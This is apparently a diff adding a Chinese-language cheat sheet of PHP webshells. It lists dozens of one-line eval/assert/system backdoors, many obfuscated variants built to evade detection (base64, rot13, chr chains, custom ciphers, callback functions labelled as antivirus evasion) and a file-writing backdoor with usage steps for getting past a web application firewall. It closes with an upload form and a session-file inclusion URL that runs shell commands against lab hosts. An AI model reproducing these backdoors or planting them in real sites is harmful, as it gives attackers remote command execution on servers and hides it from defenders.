@@ -1,0 +1,389 @@
+﻿1.一句话木马的形式
+
+http://www.cnblogs.com/sevck/p/5110670.html  php按位取反姿势
+
+//注可以执行系统命令的函数
+system(),eval(),assert(),``，exec(),shell_exec(),passthru(),proc_open()
+preg_replace()与/e ,
+
+@eval($_POST['a']);
+
+
+@eval($_GET['a']);
+
+<?php eval($_POST[1]);?>
+
+@eval($_REQUEST['a']);  //a=phpinfo();
+
+
+<?php @preg_replace("/[email]/e",$_POST['h'],"error"); ?>
+
+assert($_POST['a']);
+
+system($_POST['a']);
+
+
+<?php
+$string=`$_GET[c]`;
+echo "<pr>".$string."<pr>";
+?>
+
+
+
+<?php $_POST['sa']($_POST['sb']);?>   //sa=assert&sb=phpinfo();
+
+
+<?fputs(fopen(c.php,w),<?eval($_POST[c]);?>)?>
+
+
+
+<?=($_=@$_GET[2]).@$_($_GET[1])?>
+
+
+-------------------
+<?php extract($_REQUEST); @die($ctime($atime));
+<?php $debug = pack("H*", "65787472616374"); $debug($_REQUEST); @die($ctime($atime));
+// Slightly Obfuscated to evade some greps for extract() method
+<?php $debug = "ch". "r"; $debug = implode(array_map($debug, explode(":","112:97:99:107"))); $debug = $debug("H*", "65787472616374"); $debug($_REQUEST); @die($ctime($atime));
+// Even more obfustication to avoid using any 'suspect' functions directly
+PHP extract() Backdoor RCE | Sample usage: foo.bar/backup.php?ctime=system&atime=ls -lah
+
+
+
+-------------------------------------------------------------------------------------------
+2.变形的一句话=============================================================================
+-------------------------------------------------------------------------------------------
+//变形使用的函数
+base64(),gzdeflate(),str_rot13(),chr(),
+
+
+
+$a = "a"."s"."s"."e"."r"."t";  $a($_POST[cc]);
+
+<?php array_map("ass\x65rt",(array)$_REQUEST['expdoor']);?>
+
+
+
+<?php $item['wind'] = 'assert'; $array[] = $item; $array[0]['wind']($_POST['hkwwj']);?> 
+
+
+<?php 
+$_='Cr'.'eat'.'e_F'.'unc'.'tion';
+$__=@$_('$'.'X','@'.'E'.'v'.'a'.'l'.'('.'$'.'_'.'P'.'O'.'S'.'T'.'[$'.'X'.']'.');');
+@$__('/*'.'^'.'_'.'^'.'*/');
+die(header('HTTP/1.0 404 Not Found'));
+?>
+
+//    /*^_^*/=phpinfo();
+
+
+<?php 
+$f=realpath(dirname(__FILE__)."./").$POST['z1'];
+$c=$_POST['z2'];
+$buf="";
+for($i=0;$i<strlen($c);$i+=2)$buf.=urldecode("%".substr($c,$i,2));
+@fwrite(fopen($f,"w"),$buf);
+echo "ok";
+?>
+z1=/seqweqw.php&z2=3c3f70687020706870696e666f28293b3f3e   使用url 转义编码去掉%
+
+
+
+
+
+
+<?php 
+$uf="snc3"; 
+$ka="IEBldmFbsK"; 
+$pjt="CRfUE9TVF"; 
+$vbl = str_replace("ti","","tistittirti_rtietipltiatice"); 
+$iqw="F6ciddKTs="; 
+$bkf = $vbl("k", "", "kbakske6k4k_kdkekckokdke"); 
+$sbp = $vbl("ctw","","ctwcctwrectwatctwectw_fctwuncctwtctwioctwn"); 
+$mpy = $sbp('', $bkf($vbl("b", "", $ka.$pjt.$uf.$iqw))); $mpy(); 
+?>
+
+
+
+<?php
+$_uU=chr(99).chr(104).chr(114);
+echo $_uU;
+$_cC=$_uU(101).$_uU(118).$_uU(97).$_uU(108).$_uU(40).$_uU(36).$_uU(95).$_uU(80).$_uU(79).$_uU(83).$_uU(84).$_uU(91).$_uU(49).$_uU
+
+(93).$_uU(41).$_uU(59);$_fF=$_uU(99).$_uU(114).$_uU(101).$_uU(97).$_uU(116).$_uU(101).$_uU(95).$_uU(102).$_uU(117).$_uU(110).$_uU(99).$_uU(116).$_uU(105).$_uU(111).
+
+$_uU(110);
+echo $_cC;
+$_=$_fF("",$_cC);@$_();
+?>
+//eval($_POST[1])
+
+
+
+
+<?
+$__C_C="WlhaaGJDZ2tYMUJQVTFSYmVGMHBPdz09";
+$__P_P="abcdefghijklmnopqrstuvwxyz";
+$__X_X="123456789";
+$__O_O=$__X_X[5].$__X_X[3]."_";
+$__B_B=$__P_P{1}.$__P_P[0].$__P_P[18].$__P_P[4];
+$__H_H=$__B_B.$__O_O.$__P_P[3].$__P_P[4].$__P_P[2].$__P_P[14].$__P_P[3].$__P_P[4];
+$__E_E=$__P_P[4].$__P_P[21].$__P_P[0].$__P_P[11];
+$__F_F=$__P_P[2].$__P_P[17].$__P_P[4].$__P_P[0].$__P_P[19].$__P_P[4];
+$__F_F.='_'.$__P_P[5].$__P_P[20].$__P_P[13].$__P_P[2].$__P_P[19].$__P_P[8].$__P_P[14].$__P_P[13];
+$_[00]=$__F_F('$__S_S',$__E_E.'("$__S_S");');
+@$_[00]($__H_H($__H_H($__C_C)));
+?>
+//两次base64加密 然后解密 
+//$_POST['x'];
+
+
+
+
+<?php @$_="s"."s"./*- 
+//////////////////// 
+*-*/"e"./*-/*-*/"r";@$_=/*-/*-*/"a"./*-/*-*/$_./*-/*-*/"t";@$_/*-/*-*/($/*-/*-*/{"_P"./*-/*-*/"OS"./*-/*-*/"T"}[/*-/ 
+/////////////////////
+*-*/0/*-/*-*/-/*-/*-*/2/*-/*-*/-/*-/*-*/5/*-/*-*/]);?>
+//$_POST[-7]
+
+
+
+<?php
+md5($_GET['qid'])=='850abe17d6d33516c10c6269d899fd19'?array_map("assert",(array)$_REQUEST['page']):next;
+?>
+//qid=zxexp&page=phpinfo();
+
+
+
+<?php eval(str_rot13('riny($_CBFG[cntr]);'));?>
+//$_POST['page']
+
+
+<?php $k = str_replace("8","","a8s88s8e8r88t");$k($_POST["8"]); ?>
+
+
+<?php $c='ass'.'ert';${c}($_POST[4]);?>  
+
+<?php
+$a=md5('a').'<br>';
+$poc=substr($a,14,1).chr(115).chr(115).substr($a,22,1).chr(114).chr(116);
+$poc($_GET['a']); //assert($_GET['a']);
+?>
+
+
+<?php
+@include($_FILES['u']['tmp_name']);
+?>
+//利用了include可以把任何文件当php来解释的特性, 当我们上传一个文件的时候，会在服务器上生成一个临时文件，而$_FILES这个变量里面正好保存了这个文件的路径，所以可以直接include进来。
+然后构造表单包含临时文件执行指定的php代码
+
+<form action="http://192.168.189.135/webshell/s.php" method="POST" enctype="multipart/form-data">  
+    <input type="file" name='u'>  
+    <button>shell</button>  
+</form> 
+
+
+
+
+<?php
+function cve($str,$key)
+{
+$t="";
+for($i=0; $i<strlen($str); $i=$i+2)
+{
+  $k=(($i+2)/2)%strlen($key);
+  $p=substr($key, $k,1);
+  if(is_numeric(substr($str, $i,1)))
+  {
+    $t=$t.chr(hexdec(substr($str, $i,2))-$p);
+  }
+  else
+  {
+    $t=$t.chr(hexdec(substr($str, $i,4)));
+    $i=$i+2;
+  }
+}
+return($t);
+}
+
+(@$_=cve('6A767C687B77','39')).@$_(cve('6776666E286763736A38346466656871646A2A2464524F58565B2C7C302C5F292E','520'));
+?>
+//z0=cGhwaW5mbygpOw==
+
+
+
+
+
+
+
+==============================================================================================
+3.回调函数(免杀)------------------------------------------------------------------------------
+=============================================================================================
+function test($str)
+{
+    //......
+    //......
+    return $str;
+}
+echo test("{${phpinfo()}}");
+可以执行phpinfo()函数
+
+
+
+<?php
+class helloword{
+    public function sayhelloto($name){
+        $last_line=system($name);
+        return $last_line;
+    }
+}
+$a=$_GET['a'];
+$reflectionMethod=new ReflectionMethod("helloword","sayhelloto");
+echo $reflectionMethod->invoke(new helloword(),$a);
+?>
+//a=ifconfig
+
+可以简化
+$func=new ReflectionFunction("system");
+echo $func->invokeArgs(array("$_GET[c]"));
+
+
+
+
+
+<?php 
+$e = $_REQUEST['e'];
+register_shutdown_function($e, $_REQUEST['pass']);
+?>
+//?e=assert&pass=phpinfo();
+
+
+<?php 
+$e = $_REQUEST['e'];
+register_shutdown_function($e, $_REQUEST['pass']);
+?>
+//?e=assert&pass=phpinfo();
+
+
+<?php 
+ob_start(function ($c,$d){register_shutdown_function('assert',$c);}); 
+echo $_REQUEST['pass']; 
+ob_end_flush(); 
+?>
+
+
+
+
+<?php 
+filter_var($_REQUEST['pass'], FILTER_CALLBACK, array('options' => 'assert'));
+?>
+
+
+<?php 
+$e = $_REQUEST['e'];
+declare(ticks=1);
+register_tick_function ($e, $_REQUEST['pass']);
+?>
+//?e=assert&pass=phpinfo();
+
+
+<?php 
+preg_replace_callback('/.+/i', create_function('$arr', 'return assert($arr[0]);'),$_REQUEST['pass']);
+?>
+使用php5.5之后的回调后门替代preg_replace
+类似的
+mb_ereg_replace_callback('.+', create_function('$arr', 'return assert($arr[0]);'),$_REQUEST['pass']);
+
+
+<?php 
+$iterator = new CallbackFilterIterator(new ArrayIterator(array($_REQUEST['pass'],)), create_function('$a', 'assert($a);'));
+    foreach ($iterator as $item) {
+    echo $item;}
+?>
+
+
+
+
+
+
+
+<?php
+    $p=realpath(dirname(__FILE__)."/../").$_POST["a"];
+    $t=$_POST["b"];
+    $tt="";
+    for ($i=0;$i<strlen($t);$i+=2) $tt.=urldecode("%".substr($t,$i,2));
+    @fwrite(fopen($p,"w"),$tt);
+    echo "success!";
+?>
+
+
+分析利用&过狗：
+
+    <?php
+    $p=realpath(dirname(__FILE__)."/../").$_POST["a"]; //定义$p为根目录的物理路径+$_POST["a"]的内容
+    $t=$_POST["b"]; //定义$t为$_POST["b"]的内容
+    $tt=""; //定义$tt为空
+    for ($i=0;$i<strlen($t);$i+=2) $tt.=urldecode("%".substr($t,$i,2)); //for循环次数是$t长度/2，每循环一次就让$tt加上“%xx”这样的编码
+    @fwrite(fopen($p,"w"),$tt); //写入文件地址是$p，内容是$tt
+    echo "success!";
+    ?>
+
+
+利用方法：
+
+将写入的内容用url编码，比如
+
+    <?php phpinfo();?>
+
+编码后为：
+
+    %3C%3F%70%68%70%20%70%68%70%69%6E%66%6F%28%29%3B%3F%3E
+
+去掉其中的%，得到：
+
+    3C3F70687020706870696E666F28293B3F3E
+
+然后访问后门，将POST内容改为：
+
+    a=/111.php&b=3C3F70687020706870696E666F28293B3F3E
+
+即可写入内容  
+
+
+
+
+4.间接调用函数-->callback
+支持的函数
+ob_start()   array_map(),array_filter,array_reduce
+usort(),uksort(),array_walk(),array_diff_ukey()
+
+<?php 
+$cmd='system';
+ob_start($cmd);
+echo "$_GET[a]";
+ob_end_flush();
+?>
+//a=whoami
+
+
+
+<?php
+session_start();
+extract($_GET);
+//if(preg_match('/[0-9]/', $_SESSION['PHPSESSID'])) exit;
+//if (preg_match('/\/|\./',$_SESSION['PHPSESSID'])) exit;
+var_dump($_GET);
+echo "<br>";
+var_dump($_SESSION);
+echo "<br>";
+var_dump($_SESSION['PHPSESSID']);
+include(ini_get("session.save_path")."/sess_".$_SESSION['PHPSESSID']);
+echo $_SESSION['PHPSESSID'];
+echo ini_get("session.save_path");
+?>
+http://192.168.189.137:81/wrong.php?_SESSION[PHPSESSID]=cnobogfkcifcsb68ggmnuikao3&_SESSION[name]=<?php system("ls"); ?>
+
+
+这一串需要查看http头中sessionid 串
+文件保存到了/var/lib/php5/ 目录下
